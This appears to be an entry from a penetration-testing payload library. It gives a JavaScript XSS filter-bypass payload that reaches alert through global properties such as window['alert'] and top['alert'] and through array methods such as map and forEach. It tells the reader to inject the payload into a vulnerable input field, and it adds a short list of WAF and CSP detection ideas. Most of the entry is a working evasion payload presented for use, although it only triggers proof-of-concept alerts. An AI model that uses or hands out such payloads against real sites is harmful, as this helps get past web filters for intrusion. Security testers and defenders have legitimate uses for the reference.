---
id: a8f52519-8995-4883-aa15-eeaa50aadde5
type: code
language: JavaScript
verified: true
created_at: '2023-04-06T03:56:42.768173+00:00'
updated_at: '2023-04-10T20:21:46.075934+00:00'
tags:
  - xss
  - bypass
  - alert
platforms:
  - Web
  - Browser
validated: true
---

# XSS-Alert-Bypass-Using-Global-Properties-and-Array-Methods

## Code

```javascript
window['alert'](0)
parent['alert'](1)
self['alert'](2)
top['alert'](3)
this['alert'](4)
frames['alert'](5)
content['alert'](6)

[7].map(alert)
[8].find(alert)
[9].every(alert)
[10].filter(alert)
[11].findIndex(alert)
[12].forEach(alert);
```

## Description

This code snippet demonstrates bypassing XSS filters by accessing the alert function through various global object properties (window, parent, self, etc.) and invoking it via array prototype methods (map, find, etc.). It produces sequential numbered alerts to confirm execution without direct 'alert()' calls.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| N/A | No variables; hardcoded numbers for alert arguments | N/A |

## Usage

Inject this into an XSS vulnerability (e.g., via a reflected input field) or execute in the browser console during testing. Useful for initial payload confirmation in filter evasion scenarios.

## Detection

- Monitor for multiple alert popups or console logs in browser dev tools.
- WAF rules detecting property access patterns like window['alert'] or array method chaining.
- CSP violations if inline scripts are restricted.

## Related

- [[procedures/Bypass-XSS-Alert-Filter-Using-Alternate-Functions]]
